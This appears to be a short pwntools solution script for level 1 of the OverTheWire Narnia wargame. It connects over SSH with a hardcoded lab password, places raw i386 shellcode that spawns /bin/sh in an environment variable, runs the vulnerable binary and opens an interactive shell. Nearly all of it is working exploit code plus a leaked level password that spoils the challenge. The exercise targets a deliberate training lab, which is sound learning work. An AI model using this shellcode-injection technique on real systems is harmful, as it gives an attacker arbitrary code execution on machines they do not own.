# Overthewire: Narnia 2
# woanmeo11

from pwn import *

s = ssh(host='narnia.labs.overthewire.org', user='narnia1', password='efeidiedae', port=2226)

shellcode = b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
s = s.process('/narnia/narnia1', env={'EGG': shellcode})
#s = s.process('/narnia/narnia1', env={'EGG': asm(shellcraft.i386.linux.sh())})

s.interactive()
